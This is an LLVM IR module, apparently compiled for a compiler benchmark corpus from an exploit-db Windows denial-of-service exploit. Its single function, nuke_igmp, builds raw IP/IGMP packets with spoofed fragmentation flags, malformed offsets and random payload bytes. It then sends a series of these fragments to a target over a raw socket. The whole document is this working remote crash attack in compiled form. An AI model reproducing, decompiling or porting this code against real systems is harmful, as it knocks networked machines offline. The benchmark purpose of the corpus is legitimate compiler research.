; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19413.c_nuke_igmp.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19413.c_nuke_igmp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.iphdr = type { i32, i32, i32, i64, i8*, i8*, i32, i8*, i32, i8* }
%struct.igmphdr = type { i8*, i64, i64 }
%struct.utsname = type { i32 }
%struct.passwd = type { i32 }

@IPPROTO_IGMP = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"error: socket()\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"error: sendto()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @nuke_igmp(%struct.sockaddr_in* %0, i64 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.iphdr*, align 8
  %9 = alloca %struct.igmphdr*, align 8
  %10 = alloca %struct.utsname*, align 8
  %11 = alloca %struct.passwd*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.sockaddr_in* %0, %struct.sockaddr_in** %4, align 8
  store i64 %1, i64* %5, align 8
  store i32 1500, i32* %6, align 4
  %15 = call i32 (...) @random()
  %16 = srem i32 %15, 40000
  %17 = add nsw i32 %16, 500
  store i32 %17, i32* %14, align 4
  %18 = load i32, i32* %6, align 4
  %19 = call i64 @calloc(i32 1, i32 %18)
  %20 = inttoptr i64 %19 to i8*
  store i8* %20, i8** %7, align 8
  %21 = load i8*, i8** %7, align 8
  %22 = bitcast i8* %21 to %struct.iphdr*
  store %struct.iphdr* %22, %struct.iphdr** %8, align 8
  %23 = load i8*, i8** %7, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 72
  %25 = bitcast i8* %24 to %struct.igmphdr*
  store %struct.igmphdr* %25, %struct.igmphdr** %9, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 0
  store i32 4, i32* %27, align 8
  %28 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %29 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %28, i32 0, i32 1
  store i32 18, i32* %29, align 4
  %30 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %31 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %30, i32 0, i32 2
  store i32 255, i32* %31, align 8
  %32 = load i32, i32* %6, align 4
  %33 = call i8* @htons(i32 %32)
  %34 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %35 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %34, i32 0, i32 9
  store i8* %33, i8** %35, align 8
  %36 = load i32, i32* @IPPROTO_IGMP, align 4
  %37 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i32 0, i32 8
  store i32 %36, i32* %38, align 8
  %39 = load i32, i32* %14, align 4
  %40 = call i8* @htons(i32 %39)
  %41 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 7
  store i8* %40, i8** %42, align 8
  %43 = load i32, i32* @IP_MF, align 4
  %44 = call i8* @htons(i32 %43)
  %45 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 4
  store i8* %44, i8** %46, align 8
  %47 = load i64, i64* %5, align 8
  %48 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 3
  store i64 %47, i64* %49, align 8
  %50 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %50, i32 0, i32 0
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 6
  store i32 %53, i32* %55, align 8
  %56 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %57 = bitcast %struct.iphdr* %56 to i16*
  %58 = call i8* @in_cksum(i16* %57, i32 72)
  %59 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 5
  store i8* %58, i8** %60, align 8
  %61 = load %struct.igmphdr*, %struct.igmphdr** %9, align 8
  %62 = getelementptr inbounds %struct.igmphdr, %struct.igmphdr* %61, i32 0, i32 2
  store i64 0, i64* %62, align 8
  %63 = load %struct.igmphdr*, %struct.igmphdr** %9, align 8
  %64 = getelementptr inbounds %struct.igmphdr, %struct.igmphdr* %63, i32 0, i32 1
  store i64 0, i64* %64, align 8
  %65 = load %struct.igmphdr*, %struct.igmphdr** %9, align 8
  %66 = bitcast %struct.igmphdr* %65 to i16*
  %67 = call i8* @in_cksum(i16* %66, i32 24)
  %68 = load %struct.igmphdr*, %struct.igmphdr** %9, align 8
  %69 = getelementptr inbounds %struct.igmphdr, %struct.igmphdr* %68, i32 0, i32 0
  store i8* %67, i8** %69, align 8
  store i32 97, i32* %12, align 4
  br label %70

70:                                               ; preds = %82, %2
  %71 = load i32, i32* %12, align 4
  %72 = load i32, i32* %6, align 4
  %73 = icmp slt i32 %71, %72
  br i1 %73, label %74, label %85

74:                                               ; preds = %70
  %75 = call i32 (...) @random()
  %76 = srem i32 %75, 255
  %77 = trunc i32 %76 to i8
  %78 = load i8*, i8** %7, align 8
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8 %77, i8* %81, align 1
  br label %82

82:                                               ; preds = %74
  %83 = load i32, i32* %12, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %12, align 4
  br label %70

85:                                               ; preds = %70
  %86 = load i8*, i8** %7, align 8
  %87 = getelementptr inbounds i8, i8* %86, i64 72
  %88 = getelementptr inbounds i8, i8* %87, i64 24
  %89 = getelementptr inbounds i8, i8* %88, i64 40
  %90 = bitcast i8* %89 to %struct.utsname*
  store %struct.utsname* %90, %struct.utsname** %10, align 8
  %91 = load %struct.utsname*, %struct.utsname** %10, align 8
  %92 = call i32 @uname(%struct.utsname* %91)
  %93 = load %struct.utsname*, %struct.utsname** %10, align 8
  %94 = bitcast %struct.utsname* %93 to i8*
  %95 = getelementptr i8, i8* %94, i64 4
  %96 = getelementptr i8, i8* %95, i64 10
  %97 = bitcast i8* %96 to %struct.passwd*
  store %struct.passwd* %97, %struct.passwd** %11, align 8
  %98 = load %struct.passwd*, %struct.passwd** %11, align 8
  %99 = call i32 (...) @getuid()
  %100 = call i32 @getpwuid(i32 %99)
  %101 = call i32 @memcpy(%struct.passwd* %98, i32 %100, i32 4)
  %102 = load i32, i32* @AF_INET, align 4
  %103 = load i32, i32* @SOCK_RAW, align 4
  %104 = load i32, i32* @IPPROTO_RAW, align 4
  %105 = call i32 @socket(i32 %102, i32 %103, i32 %104)
  store i32 %105, i32* %13, align 4
  %106 = icmp slt i32 %105, 0
  br i1 %106, label %107, label %109

107:                                              ; preds = %85
  %108 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %161

109:                                              ; preds = %85
  %110 = load i32, i32* %13, align 4
  %111 = load i8*, i8** %7, align 8
  %112 = load i32, i32* %6, align 4
  %113 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %114 = call i32 @sendto(i32 %110, i8* %111, i32 %112, i32 0, %struct.sockaddr_in* %113, i32 4)
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %118

116:                                              ; preds = %109
  %117 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %161

118:                                              ; preds = %109
  %119 = call i32 @usleep(i32 1000000)
  store i32 1, i32* %12, align 4
  br label %120

120:                                              ; preds = %153, %118
  %121 = load i32, i32* %12, align 4
  %122 = icmp slt i32 %121, 5
  br i1 %122, label %123, label %156

123:                                              ; preds = %120
  %124 = load i32, i32* %12, align 4
  %125 = icmp sgt i32 %124, 3
  br i1 %125, label %126, label %135

126:                                              ; preds = %123
  %127 = load i32, i32* %6, align 4
  %128 = sub nsw i32 %127, 20
  %129 = load i32, i32* %12, align 4
  %130 = mul nsw i32 %128, %129
  %131 = ashr i32 %130, 3
  %132 = call i8* @htons(i32 %131)
  %133 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 4
  store i8* %132, i8** %134, align 8
  br label %146

135:                                              ; preds = %123
  %136 = load i32, i32* %6, align 4
  %137 = sub nsw i32 %136, 20
  %138 = load i32, i32* %12, align 4
  %139 = mul nsw i32 %137, %138
  %140 = ashr i32 %139, 3
  %141 = load i32, i32* @IP_MF, align 4
  %142 = or i32 %140, %141
  %143 = call i8* @htons(i32 %142)
  %144 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i8* %143, i8** %145, align 8
  br label %146

146:                                              ; preds = %135, %126
  %147 = load i32, i32* %13, align 4
  %148 = load i8*, i8** %7, align 8
  %149 = load i32, i32* %6, align 4
  %150 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %151 = call i32 @sendto(i32 %147, i8* %148, i32 %149, i32 0, %struct.sockaddr_in* %150, i32 4)
  %152 = call i32 @usleep(i32 2000000)
  br label %153

153:                                              ; preds = %146
  %154 = load i32, i32* %12, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %12, align 4
  br label %120

156:                                              ; preds = %120
  %157 = load i8*, i8** %7, align 8
  %158 = call i32 @free(i8* %157)
  %159 = load i32, i32* %13, align 4
  %160 = call i32 @close(i32 %159)
  store i32 0, i32* %3, align 4
  br label %161

161:                                              ; preds = %156, %116, %107
  %162 = load i32, i32* %3, align 4
  ret i32 %162
}

declare dso_local i32 @random(...) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @in_cksum(i16*, i32) #1

declare dso_local i32 @uname(%struct.utsname*) #1

declare dso_local i32 @memcpy(%struct.passwd*, i32, i32) #1

declare dso_local i32 @getpwuid(i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
